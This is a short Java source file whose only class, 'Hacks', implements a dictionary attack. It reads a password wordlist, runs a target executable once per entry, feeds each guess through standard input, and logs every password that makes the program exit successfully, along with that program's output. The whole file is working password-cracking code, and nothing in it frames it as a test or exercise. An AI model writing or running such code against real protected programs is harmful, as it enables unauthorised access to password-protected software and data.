package maven;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

public class Hacks {
	public void dictionaryAttack(String dictPath, String exePath) throws Exception {
		List<String> passwords = Files.lines(Path.of(dictPath)).toList();
		PrintWriter wr = new PrintWriter("/var/log/dict_attack.log");
		Runtime runtime = Runtime.getRuntime();
		for (String password: passwords) {
			Process process = runtime.exec(exePath);
			InputStream inputStream = process.getInputStream();
			OutputStream outputStream = process.getOutputStream();
			outputStream.write(password.getBytes());
			outputStream.close();
			InputStreamReader isr = new InputStreamReader(inputStream);
			BufferedReader reader = new BufferedReader(isr);
			StringBuilder data = new StringBuilder();
			while (true) {
				String line = reader.readLine();
				if (line == null) break;
				data.append(line);
			}
			int retval = process.waitFor();
			reader.close();
			isr.close();
			inputStream.close();
			if (retval == 0)
				wr.println(password + ": " + data.toString());
		}
		wr.flush();
		wr.close();
	}
}
